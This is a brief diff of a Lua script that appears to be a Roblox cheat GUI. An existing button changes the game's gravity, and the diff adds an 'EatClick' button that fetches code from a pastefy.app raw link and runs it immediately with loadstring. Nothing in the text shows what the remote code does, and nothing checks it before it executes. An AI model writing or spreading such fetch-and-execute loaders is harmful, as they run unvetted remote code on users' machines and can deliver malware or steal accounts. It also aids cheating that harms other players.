@@ -500,3 +500,6 @@ end)
 Gravity.MouseButton1Click:connect(function()
 	game.Workspace.Gravity = 5
 end)
+EatClick.MouseButton1Click:connect(function()
+loadstring(game:HttpGet("https://pastefy.app/cOIKtlqT/raw", true))()
+end)
